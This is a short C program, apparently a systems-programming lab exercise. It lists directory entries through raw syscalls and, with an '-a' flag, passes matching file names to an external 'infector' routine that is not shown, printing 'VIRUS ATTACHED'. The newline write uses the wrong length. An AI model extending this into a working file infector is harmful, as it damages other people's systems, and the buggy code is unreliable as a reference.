#include "util.h"

#define SYS_WRITE 4
#define SYS_EXIT 1
#define SYS_GETDENTS 141
#define STDOUT 1
#define SYS_OPEN 5
#define READONLY 0
#define PERMISSION 0777
#define BUFFSIZE 8192

extern int system_call();
extern int infector();
extern int infection();

typedef struct ent{
  int inode;
  int offset;
  short len;
  char buf[];
} ent;

int main (int argc , char* argv[], char* envp[])
{
  char buff[BUFFSIZE];
  int fileDescripteor;
  ent* ent = buff;
  int count;
  int infection_flag = 0;
  char* fileName;
  char* virus_msg = " VIRUS ATTACHED\n";


  if(argc == 2 && strncmp(argv[1], "-a", 2) == 0){
    infection_flag = 1;
    fileName = argv[1] + 2;
  }



  fileDescripteor = system_call(SYS_OPEN, ".", READONLY, PERMISSION);
  if(fileDescripteor < 0){ 
    system_call(SYS_EXIT, 0x55, 0, 0);
  }

  count = system_call(SYS_GETDENTS, fileDescripteor, buff, BUFFSIZE);
  
  int i;
  for(i=0; i<count; i += ent->len){
    ent = buff + i;
    system_call(SYS_WRITE, STDOUT, ent->buf, strlen(ent->buf));

    if(infection_flag == 1 && strncmp(ent->buf, fileName, strlen(fileName)) == 0){

      infector(ent->buf);
      system_call(SYS_WRITE, STDOUT, virus_msg, strlen(virus_msg));
    }

    system_call(SYS_WRITE, STDOUT, "\n", strlen(ent->buf));
  }

  
  return 0;
}